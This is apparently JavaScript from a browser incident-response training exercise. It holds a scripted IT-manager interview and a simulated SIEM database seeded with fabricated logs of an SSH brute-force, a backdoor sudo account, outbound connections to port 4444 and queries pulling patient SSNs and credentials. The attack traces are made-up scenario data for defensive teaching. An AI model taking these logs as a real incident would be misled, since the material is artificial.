+    keys: ['training','awareness','phishing','education','staff','employee','users'],
+    topic: 'jt-training',
+    text: "We did a security awareness training session when we onboarded two years ago — it was a 45-minute video. We haven't done anything since then. I've been meaning to bring in someone for a phishing simulation but budget has been tight. Most of the staff wouldn't know what a phishing email looks like."
+  },
+  {
+    keys: ['vendor','third party','contractor','third-party','software','outside access','external access'],
+    topic: 'jt-vendor',
+    text: "We use a few external vendors — our cloud backup provider, an email security service, and we had a contractor do some custom SQL scripting last quarter. The contractor had full database access during their engagement. I'm not 100% sure I fully cleaned up their credentials afterward. That's been nagging at me this morning."
+  },
+  {
+    keys: ['what happened','breach','attack','incident','suspicious activity','suspect','suspicious','alert','anomaly'],
+    topic: null,
+    text: "So around 7 AM I came in and noticed the SIEM had a bunch of alerts from the middle of the night — I don't have anyone watching it overnight. There were a ton of failed login attempts on SSH, and then they stopped. At first I thought it was just a scan, but then I noticed a successful login right after all the failures. That's when I called your firm. I haven't touched the server since — didn't want to make things worse."
+  },
+  {
+    keys: ['timeline','what time','what hour','hours','night','overnight','when did','when was','when were'],
+    topic: null,
+    text: "The alerts started around 1:52 in the morning on May 18th. The suspicious activity seems to have run through about 3 AM. Nobody should have been logged into that server at that hour — our staff work 9 to 5."
+  },
+  {
+    keys: ['antivirus','anti-virus','edr','endpoint','malware','virus'],
+    topic: null,
+    text: "We have basic antivirus on the Windows machines. The Linux server doesn't have any endpoint protection on it — we've been relying on the firewall and access controls. I know that's a gap."
+  },
+  {
+    keys: ['patch','patching','update','updates','vulnerabilities','vulnerability'],
+    topic: null,
+    text: "Patching is... manual. I do it when I remember or when something forces my hand. The Linux server hasn't been updated in probably three months. I keep meaning to set up automatic security patches but haven't gotten there."
+  },
+  {
+    keys: ['hipaa','regulation','legal','compliance','law','notify','notification','obligation'],
+    topic: null,
+    text: "We know we have HIPAA obligations. We have a HIPAA Privacy Officer on paper — that's our office manager, Michelle — but she's not really trained for this. If this is a confirmed breach involving PHI we know we have a 60-day notification requirement to HHS, and potentially to affected patients. That's one of the reasons I'm so anxious to understand the scope of this."
+  },
+  {
+    keys: ['account','accounts','user','users','admin','root','privilege','access control','iam'],
+    topic: null,
+    text: "We have a handful of accounts on the server — myself, a couple of developers, and some service accounts for automated processes. Everyone who needed access got it, but I'll admit the principle of least privilege wasn't strictly followed. Some of the developer accounts have more access than they probably need."
+  }
+];
+
+const jordanCovered = new Set();
+let jordanMsgCount = 0;
+
+function jordanOpen() {
+  const chat = document.getElementById('jordan-chat');
+  if(chat.innerHTML !== '') return;
+  // restore covered topics from export prefill if present
+  if(window._restoredJordanCovered) {
+    window._restoredJordanCovered.forEach(t => {
+      jordanCovered.add(t);
+      const el = document.getElementById(t);
+      if(el) el.classList.add('found');
+    });
+  }
+  addJordanMsg("Thanks for coming in. This whole situation has me pretty rattled. I'll answer whatever I can — I just want to understand what happened and how bad it is. What do you need to know?", true);
+  if(jordanCovered.size > 0) {
+    addJordanMsg(`Welcome back. We've already covered ${jordanCovered.size} topic${jordanCovered.size > 1 ? 's' : ''} — feel free to continue where you left off.`, true);
+  }
+}
+
+function addJordanMsg(text, isJordan) {
+  const chat = document.getElementById('jordan-chat');
+  const div = document.createElement('div');
+  div.className = 'msg ' + (isJordan ? 'msg-jordan' : 'msg-student');
+  div.innerHTML = `<div class="speaker">${isJordan ? 'Jordan Reyes — IT Manager' : 'You (Analyst)'}</div><div class="bubble">${text}</div>`;
+  chat.appendChild(div);
+  chat.scrollTop = chat.scrollHeight;
+}
+
+function askJordan() {
+  const input = document.getElementById('jordan-input');
+  const q = input.value.trim();
+  if(!q) return;
+  input.value = '';
+  addJordanMsg(q, false);
+  jordanMsgCount++;
+
+  const lower = q.toLowerCase();
+  let matched = false;
+  function keyMatch(text, key) {
+    if(key.length <= 4) {
+      const re = new RegExp('(?:^|[^a-z])' + key.replace(/[.*+?^${}()|[\]\\]/g,'\\$&') + '(?:[^a-z]|$)');
+      return re.test(text);
+    }
+    return text.includes(key);
+  }
+  for(const r of jordanResponses) {
+    if(r.keys.some(k => keyMatch(lower, k))) {
+      addJordanMsg(r.text, true);
+      if(r.topic) {
+        jordanCovered.add(r.topic);
+        document.getElementById(r.topic).classList.add('found');
+      }
+      matched = true;
+      break;
+    }
+  }
+  if(!matched) {
+    const fallbacks = [
+      "Sorry, I'm not totally following. Can you ask it a different way?",
+      "Honestly, I don't have details on that off the top of my head — this whole morning has been a blur.",
+      "That's a bit outside my wheelhouse. Is there something else about the incident I can help with?",
+      "I'm not sure I'm the right person for that one. What else do you need to know?",
+      "Good question, but I'm drawing a blank right now. Keep going — what else?",
+      "I'm not sure I have useful info on that. My head's been completely focused on the alerts and the server this morning.",
+      "Yeah, I honestly don't know enough about that to give you a straight answer. Try asking about something else and come back to it.",
+      "That's not something I've dealt with directly. Things like the network setup, staff accounts, software we use — I can speak to those.",
+    ];
+    addJordanMsg(fallbacks[Math.floor(Math.random() * fallbacks.length)], true);
+  }
+
+}
+
+function showJordanDebriefAndProceed() {
+  const allTopics = ['jt-mfa','jt-passwords','jt-logging','jt-backup','jt-framework','jt-incident','jt-database','jt-network','jt-training','jt-vendor'];
+  const covered = allTopics.filter(t => jordanCovered.has(t)).length;
+
+  // Reveal debrief card
+  const debrief = document.getElementById('jordan-debrief');
+  debrief.style.display = 'block';
+
+  // Show uncovered items with vague labels only (no specifics)
+  const vagueLabels = {
+    'jt-mfa':      'Access controls — how users authenticate',
+    'jt-passwords':'Credential management practices',
+    'jt-logging':  'Monitoring and log retention',
+    'jt-backup':   'Backup and recovery posture',
+    'jt-framework':'Security framework adoption',
+    'jt-incident': 'Incident response preparedness',
+    'jt-database': 'Data assets and access controls',
+    'jt-network':  'Network architecture and remote access',
+    'jt-training': 'Staff security awareness',
+    'jt-vendor':   'Third-party and contractor access',
+  };
+
+  allTopics.forEach(t => {
+    const el = document.getElementById(t);
+    if(!el) return;
+    const label = el.querySelector('.fi-label');
+    if(!label) return;
+    if(jordanCovered.has(t)) {
+      el.classList.add('found');
+      label.textContent = vagueLabels[t] + ' ✓';
+    } else {
+      label.textContent = vagueLabels[t] + ' — not covered';
+      label.style.color = '#ff7b72';
+    }
+  });
+
+  const score = document.getElementById('jordan-debrief-score');
+  if(score) {
+    const missed = allTopics.length - covered;
+    if(missed === 0) {
+      score.innerHTML = '<span style="color:#56d364;">You covered all 10 topics. Strong interview.</span>';
+    } else {
+      score.innerHTML = `You covered <strong style="color:#f0f6fc;">${covered}/10</strong> topics. You can return to the interview to ask about the ${missed} uncovered area${missed > 1 ? 's' : ''} before submitting your report.`;
+    }
+  }
+
+  debrief.scrollIntoView({ behavior: 'smooth', block: 'start' });
+}
+
+// ===================== SIEM — SQL.JS =====================
+let siemDB = null;
+
+async function initSiem() {
+  const feed = document.getElementById('siem-alert-feed');
+  const results = document.getElementById('siem-results');
+  if(feed) feed.innerHTML = '<span style="color:#a8b8d0; font-size:13px;">Loading SIEM database...</span>';
+  try {
+  const SQL = await initSqlJs({ locateFile: f => `https://cdnjs.cloudflare.com/ajax/libs/sql.js/1.10.2/${f}` });
+  siemDB = new SQL.Database();
+
+  siemDB.run(`CREATE TABLE events (
+    id INTEGER PRIMARY KEY, timestamp TEXT, event_type TEXT,
+    source_ip TEXT, username TEXT, description TEXT, severity TEXT
+  );`);
+
+  siemDB.run(`CREATE TABLE db_query_log (
+    id INTEGER PRIMARY KEY, timestamp TEXT, username TEXT,
+    query_text TEXT, rows_returned INTEGER, flagged INTEGER
+  );`);
+
+  siemDB.run(`CREATE TABLE user_accounts (
+    username TEXT PRIMARY KEY, created_at TEXT, last_login TEXT,
+    is_admin INTEGER, account_status TEXT
+  );`);
+
+  // SSH brute force events
+  const bruteIp = '185.220.101.42';
+  const baseTime = new Date('2026-05-18T01:52:00');
+  for(let i=0; i<47; i++) {
+    const t = new Date(baseTime.getTime() + i * 27000);
+    const ts = t.toISOString().replace('T',' ').substring(0,19);
+    siemDB.run(`INSERT INTO events VALUES (?,?,?,?,?,?,?)`,
+      [i+1, ts, 'AUTH_FAILURE', bruteIp, 'root', `Failed password for root from ${bruteIp} port ${30000+i} ssh2`, 'medium']);
+  }
+  // successful login
+  siemDB.run(`INSERT INTO events VALUES (48,'2026-05-18 02:14:33','AUTH_SUCCESS','185.220.101.42','root','Accepted password for root from 185.220.101.42 port 31337 ssh2','critical')`);
+  // account creation
+  siemDB.run(`INSERT INTO events VALUES (49,'2026-05-18 02:14:51','USER_CREATED','185.220.101.42','root','New user account created: svc_backup (UID 1003, added to sudo group)','critical')`);
+  // normal events — day of and nearby
+  siemDB.run(`INSERT INTO events VALUES (50,'2026-05-18 08:03:11','AUTH_SUCCESS','10.0.0.5','jreyes','Accepted publickey for jreyes from 10.0.0.5 port 54321 ssh2','low')`);
+  siemDB.run(`INSERT INTO events VALUES (51,'2026-05-17 23:41:02','AUTH_FAILURE','45.33.32.156','admin','Failed password for admin from 45.33.32.156 port 22341 ssh2','low')`);
+  siemDB.run(`INSERT INTO events VALUES (52,'2026-05-18 02:17:44','FIREWALL_ALLOW','185.220.101.42','—','Outbound connection allowed: 185.220.101.42:4444 (established)','high')`);
+  siemDB.run(`INSERT INTO events VALUES (53,'2026-05-18 02:22:15','FIREWALL_ALLOW','185.220.101.42','—','Outbound connection allowed: 185.220.101.42:4444 (established)','high')`);
+  siemDB.run(`INSERT INTO events VALUES (54,'2026-05-18 07:55:00','AUTH_SUCCESS','10.0.0.8','billing_svc','Service account login: billing_svc authenticated','low')`);
+  siemDB.run(`INSERT INTO events VALUES (55,'2026-05-18 03:01:09','AUTH_SUCCESS','185.220.101.42','svc_backup','Accepted password for svc_backup from 185.220.101.42 port 31338 ssh2','critical')`);
+
+  // Background noise — May 14
+  siemDB.run(`INSERT INTO events VALUES (56,'2026-05-14 08:47:03','AUTH_SUCCESS','10.0.0.5','jreyes','Accepted publickey for jreyes from 10.0.0.5 port 51204 ssh2','low')`);
+  siemDB.run(`INSERT INTO events VALUES (57,'2026-05-14 17:31:44','AUTH_SUCCESS','10.0.0.5','jreyes','session closed for user jreyes','low')`);
+  siemDB.run(`INSERT INTO events VALUES (58,'2026-05-14 09:22:01','AUTH_SUCCESS','10.0.0.12','dev_marcus','Accepted publickey for dev_marcus from 10.0.0.12 port 49001 ssh2','low')`);
+  siemDB.run(`INSERT INTO events VALUES (59,'2026-05-14 17:04:19','AUTH_SUCCESS','10.0.0.12','dev_marcus','session closed for user dev_marcus','low')`);
+
+  // Background noise — May 15
+  siemDB.run(`INSERT INTO events VALUES (60,'2026-05-15 08:55:02','AUTH_SUCCESS','10.0.0.12','dev_marcus','Accepted publickey for dev_marcus from 10.0.0.12 port 49312 ssh2','low')`);
+  siemDB.run(`INSERT INTO events VALUES (61,'2026-05-15 09:10:44','AUTH_SUCCESS','10.0.0.8','billing_svc','Service account login: billing_svc authenticated','low')`);
+  siemDB.run(`INSERT INTO events VALUES (62,'2026-05-15 14:22:09','AUTH_FAILURE','198.51.100.23','admin','Failed password for admin from 198.51.100.23 port 44211 ssh2','low')`);
+  siemDB.run(`INSERT INTO events VALUES (63,'2026-05-15 14:22:11','AUTH_FAILURE','198.51.100.23','root','Failed password for root from 198.51.100.23 port 44213 ssh2','low')`);
+  siemDB.run(`INSERT INTO events VALUES (64,'2026-05-15 14:22:14','AUTH_FAILURE','198.51.100.23','ubuntu','Failed password for ubuntu from 198.51.100.23 port 44217 ssh2','low')`);
+  siemDB.run(`INSERT INTO events VALUES (65,'2026-05-15 17:05:33','AUTH_SUCCESS','10.0.0.12','dev_marcus','session closed for user dev_marcus','low')`);
+
+  // Background noise — May 16
+  siemDB.run(`INSERT INTO events VALUES (66,'2026-05-16 08:51:14','AUTH_SUCCESS','10.0.0.5','jreyes','Accepted publickey for jreyes from 10.0.0.5 port 52100 ssh2','low')`);
+  siemDB.run(`INSERT INTO events VALUES (67,'2026-05-16 09:10:03','AUTH_SUCCESS','10.0.0.8','billing_svc','Service account login: billing_svc authenticated','low')`);
+  siemDB.run(`INSERT INTO events VALUES (68,'2026-05-16 11:33:29','FIREWALL_BLOCK','103.41.167.33','—','Inbound connection blocked: port scan detected from 103.41.167.33','low')`);
+  siemDB.run(`INSERT INTO events VALUES (69,'2026-05-16 16:08:11','AUTH_SUCCESS','10.0.0.12','dev_marcus','Accepted publickey for dev_marcus from 10.0.0.12 port 50019 ssh2','low')`);
+  siemDB.run(`INSERT INTO events VALUES (70,'2026-05-16 17:55:44','AUTH_SUCCESS','10.0.0.5','jreyes','session closed for user jreyes','low')`);
+
+  // Background noise — May 17
+  siemDB.run(`INSERT INTO events VALUES (71,'2026-05-17 09:00:11','AUTH_SUCCESS','10.0.0.5','jreyes','Accepted publickey for jreyes from 10.0.0.5 port 53801 ssh2','low')`);
+  siemDB.run(`INSERT INTO events VALUES (72,'2026-05-17 09:15:22','AUTH_SUCCESS','10.0.0.8','billing_svc','Service account login: billing_svc authenticated','low')`);
+  siemDB.run(`INSERT INTO events VALUES (73,'2026-05-17 13:04:05','AUTH_SUCCESS','10.0.0.12','dev_marcus','Accepted publickey for dev_marcus from 10.0.0.12 port 51233 ssh2','low')`);
+  siemDB.run(`INSERT INTO events VALUES (74,'2026-05-17 14:30:19','FIREWALL_ALLOW','10.0.0.5','—','Outbound HTTPS to 142.250.80.46:443 (allowed)','low')`);
+  siemDB.run(`INSERT INTO events VALUES (75,'2026-05-17 15:44:21','AUTH_FAILURE','91.240.118.172','oracle','Failed password for oracle from 91.240.118.172 port 55001 ssh2','low')`);
+  siemDB.run(`INSERT INTO events VALUES (76,'2026-05-17 15:44:24','AUTH_FAILURE','91.240.118.172','postgres','Failed password for postgres from 91.240.118.172 port 55003 ssh2','low')`);
+  siemDB.run(`INSERT INTO events VALUES (77,'2026-05-17 15:44:27','AUTH_FAILURE','91.240.118.172','pi','Failed password for pi from 91.240.118.172 port 55007 ssh2','low')`);
+  siemDB.run(`INSERT INTO events VALUES (78,'2026-05-17 15:44:30','AUTH_FAILURE','91.240.118.172','deploy','Failed password for deploy from 91.240.118.172 port 55009 ssh2','low')`);
+  siemDB.run(`INSERT INTO events VALUES (79,'2026-05-17 17:02:44','AUTH_SUCCESS','10.0.0.12','dev_marcus','session closed for user dev_marcus','low')`);
+  siemDB.run(`INSERT INTO events VALUES (80,'2026-05-17 23:00:02','CRON_JOB','127.0.0.1','root','Scheduled task: logrotate completed successfully','low')`);
+  siemDB.run(`INSERT INTO events VALUES (81,'2026-05-17 23:41:05','AUTH_FAILURE','45.33.32.156','root','Failed password for root from 45.33.32.156 port 22344 ssh2','low')`);
+  siemDB.run(`INSERT INTO events VALUES (82,'2026-05-17 23:41:08','AUTH_FAILURE','45.33.32.156','operator','Failed password for operator from 45.33.32.156 port 22347 ssh2','low')`);
+
+  // May 18 — before the attack
+  siemDB.run(`INSERT INTO events VALUES (83,'2026-05-18 00:05:02','CRON_JOB','127.0.0.1','root','Scheduled task: nightly DB backup started','low')`);
+  siemDB.run(`INSERT INTO events VALUES (84,'2026-05-18 00:07:41','CRON_JOB','127.0.0.1','root','Scheduled task: nightly DB backup completed (2.4 GB written)','low')`);
+  siemDB.run(`INSERT INTO events VALUES (85,'2026-05-18 01:10:33','FIREWALL_BLOCK','5.188.206.14','—','Inbound port scan blocked from 5.188.206.14','low')`);
+  siemDB.run(`INSERT INTO events VALUES (86,'2026-05-18 01:11:01','AUTH_FAILURE','5.188.206.14','root','Failed password for root from 5.188.206.14 port 60012 ssh2','low')`);
+  siemDB.run(`INSERT INTO events VALUES (87,'2026-05-18 01:11:04','AUTH_FAILURE','5.188.206.14','admin','Failed password for admin from 5.188.206.14 port 60015 ssh2','low')`);
+
+  // May 18 — post-attack morning
+  siemDB.run(`INSERT INTO events VALUES (88,'2026-05-18 04:00:01','CRON_JOB','127.0.0.1','root','Scheduled task: logrotate executed','low')`);
+  siemDB.run(`INSERT INTO events VALUES (89,'2026-05-18 06:25:09','FIREWALL_ALLOW','10.0.0.8','—','Outbound connection to payment-gateway.clearpath.internal:443 (established)','low')`);
+  siemDB.run(`INSERT INTO events VALUES (90,'2026-05-18 07:48:58','AUTH_SUCCESS','10.0.0.5','jreyes','Accepted publickey for jreyes from 10.0.0.5 port 54100 ssh2','low')`);
+  siemDB.run(`INSERT INTO events VALUES (91,'2026-05-18 08:20:14','AUTH_SUCCESS','10.0.0.12','dev_marcus','Accepted publickey for dev_marcus from 10.0.0.12 port 51900 ssh2','low')`);
+  siemDB.run(`INSERT INTO events VALUES (92,'2026-05-18 08:31:02','AUTH_SUCCESS','10.0.0.8','billing_svc','Service account login: billing_svc authenticated','low')`);
+  siemDB.run(`INSERT INTO events VALUES (93,'2026-05-18 09:05:14','AUTH_FAILURE','203.0.113.44','root','Failed password for root from 203.0.113.44 port 61100 ssh2','low')`);
+  siemDB.run(`INSERT INTO events VALUES (94,'2026-05-18 09:05:17','AUTH_FAILURE','203.0.113.44','admin','Failed password for admin from 203.0.113.44 port 61103 ssh2','low')`);
+
+  // DB query log — malicious exfil queries (flagged)
+  siemDB.run(`INSERT INTO db_query_log VALUES (1,'2026-05-18 02:19:04','root','SELECT * FROM patients LIMIT 1000',1000,1)`);
+  siemDB.run(`INSERT INTO db_query_log VALUES (2,'2026-05-18 02:19:41','root','SELECT name, dob, ssn, insurance_id FROM patients WHERE billing_status = \"active\"',847,1)`);
+  siemDB.run(`INSERT INTO db_query_log VALUES (3,'2026-05-18 02:20:13','root','SELECT * FROM billing_records WHERE created_at > \"2026-01-01\"',2341,1)`);
+  siemDB.run(`INSERT INTO db_query_log VALUES (6,'2026-05-18 02:21:05','root','SHOW TABLES',8,1)`);
+  siemDB.run(`INSERT INTO db_query_log VALUES (7,'2026-05-18 02:21:33','root','SELECT * FROM user_credentials',12,1)`);
+
+  // DB query log — normal business queries (not flagged)
+  siemDB.run(`INSERT INTO db_query_log VALUES (4,'2026-05-16 09:11:03','billing_svc','SELECT invoice_id, amount, status FROM billing_records WHERE due_date = CURDATE()',12,0)`);
+  siemDB.run(`INSERT INTO db_query_log VALUES (5,'2026-05-16 10:44:22','dev_marcus','SELECT COUNT(*), created_at FROM patients GROUP BY DATE(created_at) ORDER BY created_at DESC LIMIT 30',30,0)`);
+  siemDB.run(`INSERT INTO db_query_log VALUES (8,'2026-05-16 14:05:01','billing_svc','UPDATE billing_records SET status = \"processed\" WHERE due_date < \"2026-05-16\" AND status = \"pending\"',8,0)`);
+  siemDB.run(`INSERT INTO db_query_log VALUES (9,'2026-05-17 09:16:44','billing_svc','SELECT p.name, b.invoice_id, b.amount FROM patients p JOIN billing_records b ON p.id = b.patient_id WHERE b.status = \"pending\"',44,0)`);
+  siemDB.run(`INSERT INTO db_query_log VALUES (10,'2026-05-17 11:30:09','jreyes','SELECT username, last_login, is_admin FROM user_accounts ORDER BY last_login DESC',6,0)`);
+  siemDB.run(`INSERT INTO db_query_log VALUES (11,'2026-05-17 14:33:01','jreyes','SELECT COUNT(*) FROM patients',1,0)`);
+  siemDB.run(`INSERT INTO db_query_log VALUES (12,'2026-05-17 14:55:22','dev_marcus','SELECT * FROM patients WHERE created_at > \"2026-04-01\" LIMIT 50',50,0)`);
+  siemDB.run(`INSERT INTO db_query_log VALUES (13,'2026-05-17 16:02:18','billing_svc','INSERT INTO billing_records (patient_id, amount, status, due_date) VALUES (1142, 340.00, \"pending\", \"2026-06-01\")',1,0)`);
+  siemDB.run(`INSERT INTO db_query_log VALUES (14,'2026-05-18 08:10:22','billing_svc','SELECT invoice_id, amount FROM billing_records WHERE status = \"pending\"',44,0)`);
+  siemDB.run(`INSERT INTO db_query_log VALUES (15,'2026-05-18 08:45:03','dev_marcus','SELECT id, name, created_at FROM patients ORDER BY created_at DESC LIMIT 100',100,0)`);
+  siemDB.run(`INSERT INTO db_query_log VALUES (16,'2026-05-18 09:02:11','jreyes','SELECT * FROM user_accounts',6,0)`);
+
+  // User accounts
+  const accounts = [
+    ['root','2020-03-01 00:00:00','2026-05-18 02:14:33',1,'active'],
+    ['jreyes','2020-03-01 00:00:00','2026-05-18 08:03:11',1,'active'],
+    ['billing_svc','2021-06-15 09:00:00','2026-05-18 07:55:00',0,'active'],
+    ['dev_marcus','2022-01-10 10:00:00','2026-05-12 16:44:00',0,'active'],
+    ['svc_backup','2026-05-18 02:14:51','2026-05-18 03:01:09',1,'active'],
+    ['contractor_q1','2026-01-15 09:00:00','2026-02-28 17:30:00',0,'active'],
+    ['svc_monitor','2021-03-12 00:00:00','2026-05-18 00:07:00',0,'active'],
+    ['svc_email','2021-06-01 00:00:00','2026-05-17 23:59:01',0,'active'],
+  ];
+  accounts.forEach(a => siemDB.run(`INSERT INTO user_accounts VALUES (?,?,?,?,?)`, a));
+  buildAlertFeed();
+  } catch(e) {
+    siemDB = null;
+    const errMsg = '<span class="siem-error">Could not load the SIEM database engine. Check your internet connection and refresh the page. If you\'re on a restricted network, try a different connection.</span>';
+    if(feed) feed.innerHTML = errMsg;
+    if(results) results.innerHTML = errMsg;
+  }
+}
+
+function siemCellFormat(v, colName) {
+  if(v === null) return '<em style="color:#a8b8d0">NULL</em>';
+  const cell = String(v);
+  if(colName === 'severity') {
+    const map = { critical:'badge-red', high:'badge-yellow', medium:'badge-blue', low:'badge-green' };
+    return map[cell] ? `<span class="badge ${map[cell]}">${cell}</span>` : cell;
+  }
+  if(colName === 'flagged') return cell === '1' ? '<span class="badge badge-red">YES</span>' : '<span class="badge badge-green">NO</span>';
+  if(colName === 'is_admin') return cell === '1' ? '<span class="badge badge-red">YES</span>' : '<span class="badge badge-green">NO</span>';
+  return cell.replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function mysqlToSqlite(sql) {
+  const trimmed = sql.trim();
+  const upper = trimmed.toUpperCase().replace(/\s+/g, ' ');
+
+  // SHOW TABLES
+  if(/^SHOW TABLES;?$/.test(upper))
+    return { fake: [['Tables_in_clearpath_siem'], [['events'],['db_query_log'],['user_accounts']]] };
+
+  // SHOW DATABASES
+  if(/^SHOW DATABASES;?$/.test(upper))
+    return { fake: [['Database'], [['clearpath_siem']]] };
+
+  // SHOW PROCESSLIST
+  if(/^SHOW (FULL )?PROCESSLIST;?$/.test(upper))
+    return { fake: [['Id','User','Host','db','Command','Time','State','Info'],
+      [[1,'analyst','localhost','clearpath_siem','Query',0,'executing', trimmed]]] };
+
+  // USE <db>
+  if(/^USE \w+;?$/.test(upper))
+    return { msg: 'Database changed' };
+
+  // DESCRIBE / DESC <table>
+  const descMatch = upper.match(/^(?:DESCRIBE|DESC) (\w+);?$/);
+  if(descMatch)
+    return { translated: `SELECT name as 'Field', type as 'Type', CASE "notnull" WHEN 1 THEN 'NO' ELSE 'YES' END as 'Null', CASE pk WHEN 1 THEN 'PRI' ELSE '' END as 'Key', dflt_value as 'Default' FROM pragma_table_info('${descMatch[1].toLowerCase()}');` };
+
+  // SHOW COLUMNS FROM <table>
+  const colMatch = upper.match(/^SHOW (?:FULL )?COLUMNS FROM (\w+);?$/);
+  if(colMatch)
+    return { translated: `SELECT name as 'Field', type as 'Type', CASE "notnull" WHEN 1 THEN 'NO' ELSE 'YES' END as 'Null', CASE pk WHEN 1 THEN 'PRI' ELSE '' END as 'Key', dflt_value as 'Default' FROM pragma_table_info('${colMatch[1].toLowerCase()}');` };
+
+  // SHOW CREATE TABLE <table>
+  const createMatch = upper.match(/^SHOW CREATE TABLE (\w+);?$/);
+  if(createMatch)
+    return { translated: `SELECT name as 'Table', sql as 'Create Table' FROM sqlite_master WHERE type='table' AND name='${createMatch[1].toLowerCase()}';` };
+
+  // SHOW INDEX FROM <table>
+  const idxMatch = upper.match(/^SHOW (?:INDEX|INDEXES|KEYS) FROM (\w+);?$/);
+  if(idxMatch)
+    return { translated: `SELECT '${idxMatch[1].toLowerCase()}' as 'Table', name as 'Key_name', * FROM pragma_index_list('${idxMatch[1].toLowerCase()}');` };
+
+  // SHOW STATUS / SHOW VARIABLES
+  if(/^SHOW (STATUS|VARIABLES);?$/.test(upper))
+    return { fake: [['Variable_name','Value'],[['version','8.0.36 (SQLite compat)'],['database','clearpath_siem'],['uptime','47 days']]] };
+
+  // NOW() → datetime('now')
+  let translated = trimmed.replace(/\bNOW\(\)/gi, "datetime('now')");
+  // IFNULL already supported; ISNULL → IS NULL
+  translated = translated.replace(/\bISNULL\(/gi, '(');
+  // LIMIT x,y → LIMIT y OFFSET x  (MySQL shorthand)
+  translated = translated.replace(/\bLIMIT\s+(\d+)\s*,\s*(\d+)/gi, 'LIMIT $2 OFFSET $1');
+
+  return { translated };
+}
+
+function renderFakeResult(fake) {
+  const [columns, rows] = fake;
+  let html = '<div style="overflow-x:auto;"><table class="siem-table"><thead><tr>';
+  columns.forEach(c => html += `<th>${c}</th>`);
+  html += '</tr></thead><tbody>';
+  rows.forEach(row => {
+    html += '<tr>';
+    row.forEach(v => html += `<td>${v === null ? '<em style="color:#a8b8d0">NULL</em>' : String(v).replace(/</g,'&lt;').replace(/>/g,'&gt;')}</td>`);
+    html += '</tr>';
+  });
+  html += `</tbody></table></div><p style="color:#a8b8d0; font-size:11px; margin-top:6px;">${rows.length} row(s) returned.</p>`;
+  return html;
+}
+
+function runSiemQuery() {
+  const raw = document.getElementById('siem-input').value.trim();
+  const results = document.getElementById('siem-results');
+  const status = document.getElementById('siem-status-bar');
+  if(!raw) return;
+  if(!siemDB) { results.innerHTML = '<span class="siem-error">Database not loaded yet. Please wait a moment and try again.</span>'; return; }
+
+  const parsed = mysqlToSqlite(raw);
+
+  // Fake result (SHOW TABLES etc.)
+  if(parsed.fake) {
+    results.innerHTML = renderFakeResult(parsed.fake);
+    if(status) status.textContent = `Query completed — ${parsed.fake[1].length} row(s) returned`;
+    return;
+  }
+
+  // Friendly message (USE db)
+  if(parsed.msg) {
+    results.innerHTML = `<span style="color:#3fb950; font-size:13px;">${parsed.msg}</span>`;
+    if(status) status.textContent = parsed.msg;
+    return;
+  }
+
+  const sql = parsed.translated || raw;
+  const t0 = performance.now();
+  try {
+    const res = siemDB.exec(sql);
+    const elapsed = (performance.now() - t0).toFixed(1);
+    if(!res.length) {
+      results.innerHTML = '<span style="color:#3fb950; font-size:13px;">Query executed successfully. No rows returned.</span>';
+      if(status) status.textContent = `Query completed in ${elapsed}ms — 0 rows`;
+      return;
+    }
+    let html = '';
+    let totalRows = 0;
+    res.forEach(r => {
+      totalRows += r.values.length;
+      html += '<div style="overflow-x:auto;"><table class="siem-table"><thead><tr>';
+      r.columns.forEach(c => html += `<th>${c}</th>`);
+      html += '</tr></thead><tbody>';
+      r.values.forEach(row => {
+        html += '<tr>';
+        row.forEach((v, ci) => html += `<td>${siemCellFormat(v, r.columns[ci])}</td>`);
+        html += '</tr>';
+      });
+      html += `</tbody></table></div><p style="color:#a8b8d0; font-size:11px; margin-top:6px; padding-bottom:8px;">${r.values.length} row(s) returned.</p>`;
+    });
+    results.innerHTML = html;
+    if(status) status.textContent = `Query completed in ${elapsed}ms — ${totalRows} row(s) returned`;
+  } catch(e) {
+    results.innerHTML = `<span class="siem-error">SQL Error: ${e.message}</span>`;
+    if(status) status.textContent = `Error: ${e.message}`;
+  }
+}
+
+function clearSiemQuery() {
+  document.getElementById('siem-input').value = '';
+  document.getElementById('siem-results').innerHTML = '<span style="color:#a8b8d0;">Run a query to see results.</span>';
+  document.getElementById('siem-status-bar').textContent = 'Ready';
+}
+
+function loadSearch(sql) {
+  document.getElementById('siem-input').value = sql;
+  document.getElementById('siem-input').focus();
+  document.getElementById('siem-status-bar').textContent = 'Query loaded — press Run to execute';
+}
+
+function buildAlertFeed() {
+  if(!siemDB) return;
+  try {
+    // Severity counts
+    const sevRes = siemDB.exec("SELECT severity, COUNT(*) as c FROM events GROUP BY severity;");
+    const counts = { critical:0, high:0, medium:0, low:0 };
+    if(sevRes.length) sevRes[0].values.forEach(r => { if(counts[r[0]] !== undefined) counts[r[0]] = r[1]; });
+    ['critical','high','medium','low'].forEach(s => {
+      const el = document.getElementById(`siem-count-${s}`);
+      if(el) el.textContent = counts[s];
+    });
+
+    // Alert feed — latest 10 by timestamp desc
+    const feedRes = siemDB.exec("SELECT id, timestamp, event_type, source_ip, username, description, severity FROM events ORDER BY timestamp DESC LIMIT 10;");
+    const feed = document.getElementById('siem-alert-feed');
+    if(!feed || !feedRes.length) return;
+    feed.innerHTML = '';
+    feedRes[0].values.forEach(row => {
+      const [id, ts, type, ip, user, desc, sev] = row;
+      const shortTs = ts ? ts.substring(5) : '';
+      const div = document.createElement('div');
+      div.className = `siem-alert-item sev-${sev}`;
+      div.innerHTML = `
+        <div class="siem-alert-ts">${shortTs}</div>
+        <div class="siem-alert-body">
+          <div class="siem-alert-type"><span class="badge badge-${sev==='critical'?'red':sev==='high'?'yellow':sev==='medium'?'blue':'green'}">${sev}</span> &nbsp;${type.replace(/_/g,' ')}</div>
+          <div class="siem-alert-desc">${desc ? desc.replace(/</g,'&lt;').replace(/>/g,'&gt;').substring(0,80)+'...' : ''}</div>
+          <div class="siem-alert-expand">
+            <div><strong>ID:</strong> ${id} &nbsp; <strong>Source IP:</strong> ${ip||'—'} &nbsp; <strong>User:</strong> ${user||'—'}</div>
+            <div style="margin-top:4px;"><strong>Full description:</strong> ${desc ? desc.replace(/</g,'&lt;').replace(/>/g,'&gt;') : '—'}</div>
+          </div>
+        </div>`;
+      div.addEventListener('click', () => div.classList.toggle('expanded'));
+      feed.appendChild(div);
+    });
+  } catch(e) { /* db not ready */ }
+}
+
+// ===================== TERMINAL =====================
+const termHistory = [];
+let termHistIdx = -1;
+let termCwd = '/home/analyst';
+
+// Filesystem: each entry has visible files, hidden files, and parent path
+const termFS = {
+  '/':                    { v:['etc','tmp','var','home','bin','usr'],          h:[],                                      p:'/' },
